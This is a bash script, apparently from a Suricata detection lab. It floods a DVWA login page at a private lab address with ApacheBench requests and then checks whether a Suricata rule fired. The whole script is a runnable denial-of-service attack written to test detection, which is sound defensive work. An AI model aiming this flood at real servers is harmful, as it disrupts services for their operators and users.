#!/usr/bin/env bash
# ============================================================
# Ataque 3: DoS HTTP Flood contra DVWA
#
# Detecta: Suricata rule 1000040 (User-Agent ApacheBench)
# Backup: Suricata rule 1000040 si usamos ab
# Tambien: HTTP flood (muchas requests por segundo)
# ============================================================
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"

VICTIM_IP="10.10.10.40"
SOURCE_CONTAINER="attacker"

# Parametros del flood (moderados para no tumbar el lab)
REQUESTS=200
CONCURRENCY=10
TARGET_URL="http://$VICTIM_IP/login.php"

echo "============================================================"
echo " ATAQUE 3: DoS HTTP Flood (ApacheBench)"
echo "============================================================"
echo "Objetivo:  $TARGET_URL"
echo "Requests:  $REQUESTS"
echo "Concurr:   $CONCURRENCY"
echo ""

# ApacheBench (ab) viene con Apache httpd
# Esta disponible en macOS como `/usr/sbin/ab`
echo "[+] Ejecutando ApacheBench con User-Agent identificale..."

docker exec "$SOURCE_CONTAINER" ab -n "$REQUESTS" -c "$CONCURRENCY" \
    -k -H "User-Agent: ApacheBench/2.3" \
    "$TARGET_URL" 2>&1 | tail -n 25 || true

echo ""
echo "[OK] Ataque DoS completado"
sleep 5

# Verificar
if docker exec suricata grep -q '"signature_id":1000040' /var/log/suricata/eve.json 2>/dev/null; then
    echo "[OK] Alerta Suricata 1000040 (DoS/ApacheBench) DETECTADA"
else
    echo "[--] Aun no se detecta la alerta (esperar unos segundos)"
fi